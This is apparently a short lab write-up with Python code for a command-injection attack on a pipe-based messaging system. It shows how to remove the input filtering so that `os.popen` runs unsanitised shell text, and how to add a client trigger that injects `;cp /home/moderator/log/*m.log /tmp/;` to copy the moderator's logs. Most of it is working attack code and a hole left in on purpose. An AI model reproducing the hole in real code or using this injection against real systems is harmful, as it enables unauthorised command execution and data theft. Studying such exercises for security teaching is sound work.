## Server Code Setup
In order to perform command injection, we first have to make sure that the `communication.py` in the server code DOES NOT filter out the command injection primitives that we pass to server.py - make sure the `def send(msg)` function has the following code in it.
```python
def send(msg, pipe):
#    if readVulnerability_2 != 0:
        # Hopefully don't need this filtering now that the vulnerability below is fixed...
#        msg = msg.replace("'", '').replace(';', '').replace('"', '').replace('\n', '').replace('(', '[').replace(')', ']').replace('>', '').replace('<', '').replace(':', '')

    try:
        sender = pipe.split('to')[0]
        # This commented code is a vulnerability similar to readVulnerability
        if len(msg)!=0:
            msg='(echo :%s:%s > %s%sD/%s) 2> /dev/null &'%(sender,msg,pipeRoot,pipe,pipe)
            o=os.popen(msg)

    except Exception, p:
        pass
    #log('send error:%s'%p,1,0,1)
```
## Client Code Setup
In order to make it easier to inject commands into the code, we modify the `def send()` code in `communication.py` to the following:
```python
def send(msg, pipe):
    # if readVulnerability_2 != 0:
        # Hopefully don't need this filtering now that the vulnerability below is fixed...
        #msg = msg.replace("'", '').replace(';', '').replace('"', '').replace('\n', '').replace('(', '[').replace(')', ']').replace('>', '').replace('<', '').replace(':', '')
    command_injection = False
    if msg.strip('\n').strip() == 'execute_order_66':
        msg = ';cp /home/moderator/log/*m.log /tmp/;'
        command_injection = True

    try:
        sender = pipe.split('to')[0]

        if readVulnerability_2 == 0 or command_injection:
            f = open(pipeRoot + pipe + 'D/' + pipe, 'w')
            f.write(':' + sender + ':' + msg + '\n')
            f.flush()
            f.close()
        else:
            # This commented code is a vulnerability similar to readVulnerability
            if len(msg)!=0:
                msg='(echo :%s:%s > %s%sD/%s) 2> /dev/null &'%(sender,msg,pipeRoot,pipe,pipe)
                o=os.popen(msg)

    except Exception, p:
        pass
    #log('send error:%s'%p,1,0,1)
```
Then we had to write the injected command directly into the pipe (w/o using echo otherwise the command would be injected into our current context and not on the moderator end – for that it was easier to use the code snippet under the `if readVulnerability_2 == 0` statement to directly flush the command)
